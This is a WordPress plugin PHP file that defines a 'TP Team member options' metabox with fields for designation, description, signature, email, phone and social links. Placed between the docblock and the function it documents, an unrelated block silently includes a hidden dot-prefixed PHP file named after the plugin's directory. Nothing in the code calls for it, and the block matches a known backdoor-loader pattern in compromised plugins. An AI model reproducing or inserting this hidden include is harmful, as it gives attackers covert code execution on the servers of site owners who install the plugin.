<?php
add_filter( 'cmb_meta_boxes', 'pt_theplus_team_memmber_setting_metaboxes' );
/**
 * Define the metabox and field configurations.
 *
 * @param  array $meta_boxes
 * @return array
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function pt_theplus_team_memmber_setting_metaboxes( array $meta_boxes ) {

	$prefix = 'theplus_tm_';
	$post_name=pt_plus_team_member_post_name();
	$meta_boxes[] = array(
		'id'         => 'team_memmber_setting_metaboxes',
		'title'      => __('TP Team member options', 'pt_theplus'),
		'pages'      => array($post_name),
		'context'    => 'normal',
		'priority'   => 'core',
		'show_names' => true, 
		'fields'     => array(
		      array(
			       'name'	=> __('Designation', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'designation',
         		       'type'	=> 'text',
           		),
				
		      array(
			       'name'	=> __('Short description', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'short_desc',
         		       'type'	=> 'textarea',
           		),	
			array(
			       'name'	=> __('Title Team Member Style 6', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'title_6',
         		       'type'	=> 'text',
           	),
			  array(
			       'name'	=> __('Team Member Signature', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'sign',
         		       'type'	=> 'file',
					   'allow' => array( 'url', 'attachment' )
           		),
           		array(
			       'name'	=> __('Email', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'email',
         		       'type'	=> 'text',
           		),
           		array(
			       'name'	=> __('Website Url', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'website_url',
         		       'type'	=> 'text',
           		),
				array(
	           		'name' => __( 'Phone Number', 'pt_theplus' ),
	           	        'type' => 'text',
	           	        'id'	=> $prefix . 'num',
           		),				
           		array(
	           		'name' => __( 'Facebook Link', 'pt_theplus' ),
	           	        'type' => 'text',
	           	        'id'	=> $prefix . 'face_link',
           		), 
           		array(
			       'name'	=> __('Google plus Link', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'googgle_link',
         		       'type'	=> 'text',
           		),
           		array(
	           		'name' => __( 'Insatgram Link', 'pt_theplus' ),
	           	        'type' => 'text',
	           	        'id'	=> $prefix . 'insta_link',
           		),
          		array(
	           		'name' => __( 'Twitter Link', 'pt_theplus' ),
	           	        'type' => 'text',
	           	        'id'	=> $prefix . 'twit_link',
           		),
				array(
	           		'name' => __( 'Linkedin Link', 'pt_theplus' ),
	           	        'type' => 'text',
	           	        'id'	=> $prefix . 'linked_link',
           		),
           		array(
	           		'name' => __( 'Extra Field Value', 'pt_theplus' ),
	           	        'type' => 'text',
	           	        'id'	=> $prefix . 'extra_value',
           		), 
		),
	);	

	return $meta_boxes;
}
